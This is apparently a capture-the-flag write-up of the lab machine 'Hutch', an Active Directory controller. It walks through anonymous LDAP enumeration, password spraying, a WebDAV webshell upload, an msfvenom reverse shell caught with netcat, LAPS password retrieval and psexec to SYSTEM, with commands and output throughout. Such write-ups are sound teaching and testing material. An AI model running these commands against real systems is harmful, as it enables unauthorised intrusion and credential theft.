#Windows #ActiveDirectory #LDAP #PasswordInDescription #WebDAV #LAPS #PSExec

## Overview

Hutch is an Active Directory domain controller where the foothold path runs entirely through LDAP misconfigurations and WebDAV. An anonymous LDAP dump surfaces a cleartext password stored in a user's AD description field. Those credentials authenticate against a WebDAV-enabled IIS server, which accepts an uploaded ASPX webshell and reverse shell binary. From there, LAPS (Local Administrator Password Solution) is deployed but misconfigured, an LDAP query with the found credentials reads the managed administrator password, and PSExec completes the root.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-webdav-scan:
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
88/tcp   open  kerberos-sec
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec)
445/tcp  open  microsoft-ds
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Two things stand out: WebDAV is enabled on port 80 (the HTTP methods include `PUT` and `DELETE`), and the domain is `hutch.offsec`, hostname `HUTCHDC`. LDAP is the first enumeration target.

## Foothold

### LDAP Dump, Password in Description

An anonymous LDAP bind with `ldapsearch` dumps all objects. Within the user entries, one description field contains a cleartext password:

```sh
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.190.122" "(objectclass=*)"

# Freddy McSorley, Users, hutch.offsec
description: Password set to CrabSharkJellyfish192 at user's request. Please change on next login.
```

> **Why passwords in LDAP descriptions are a real problem:** AD description fields are readable by any domain user, and in misconfigured environments by anonymous binds. Admins sometimes use them as a change-tracking note, never considering that the field is part of a directory that tools like ldapsearch, BloodHound, or PowerView will harvest automatically. It's one of the first things to grep in an LDAP dump.

Extracting all `sAMAccountName` values produces a user list. Kerbrute validates them, and spraying `CrabSharkJellyfish192` against all accounts finds one hit:

```sh
nxc smb 192.168.190.122 -u ~/users.txt -p 'CrabSharkJellyfish192' -d hutch.offsec
SMB  192.168.190.122  445  HUTCHDC  [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192
```

Credentials:

```
fmcsorley : CrabSharkJellyfish192
```

Direct WinRM or SMB auth doesn't provide a shell, but the account works for LDAP queries and is enough to interact with WebDAV.

### WebDAV Shell Upload

Nmap confirmed WebDAV with PUT enabled. Uploading an ASPX webshell (`cmdasp.aspx` from `/usr/share/webshells/aspx`) via WebDAV places it in the IIS web root:

```sh
davtest -url http://192.168.190.122 -auth fmcsorley:CrabSharkJellyfish192
# or cadaver / curl PUT
```

Confirming RCE with `whoami` and `dir` via the webshell, then generating and uploading a reverse shell binary:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe > rev.exe
```

Executing from the webshell:

```
C:\inetpub\wwwroot\rev.exe
```

Shell caught as the IIS default app pool account:

```sh
rlwrap nc -lvnp 443
connect to [...] from (UNKNOWN) [192.168.190.122] 50727

c:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

## Privilege Escalation

### LAPS Password via Authenticated LDAP Query

Checking `C:\Program Files` reveals a `LAPS\` folder with `AdmPwd.UI.exe` and `AdmPwd.Utils.dll`, LAPS is deployed. LAPS stores the current local administrator password in the `ms-Mcs-AdmPwd` LDAP attribute on the computer object. Only certain groups can read it, but `fmcsorley`'s credentials are worth trying:

```sh
ldapsearch -x -H 'ldap://192.168.190.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' \
  -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

ms-Mcs-AdmPwd: ‹redacted›
```

> **LAPS access control failures:** LAPS is designed so that only authorized groups (typically helpdesk or domain admins) can read the `ms-Mcs-AdmPwd` attribute. When a regular domain user has been granted access, even accidentally via group membership or direct ACL misconfiguration, they can query that attribute and retrieve the current machine's local administrator password in plaintext. LAPS solves the shared-password problem but only if read access is tightly controlled.

With the LAPS administrator password, PSExec delivers a SYSTEM shell via SMB:

```sh
impacket-psexec hutch.offsec/administrator:'‹redacted›'@192.168.190.122
[*] Found writable share ADMIN$
[*] Uploading file VYlBbmuo.exe
[*] Creating service aESY on 192.168.190.122.....
[*] Starting service aESY.....

C:\Windows\system32> whoami
nt authority\system
```

## Root / SYSTEM

Flags:

```
local.txt:  ‹redacted›
proof.txt:  ‹redacted›
```

## Takeaways

- **Grep every LDAP description field.** Admins who use descriptions as change-log notes often leave cleartext passwords that survive for years because nobody looks there.
- **WebDAV PUT + IIS = instant shell.** When Nmap shows WebDAV with write methods, test whether authenticated PUT uploads executable files to the web root. ASPX webshells are a clean first step.
- **LAPS is only as secure as its ACLs.** Deploying LAPS and then over-sharing `ms-Mcs-AdmPwd` read access defeats the entire purpose. Always verify that only privileged groups have that attribute read permission.
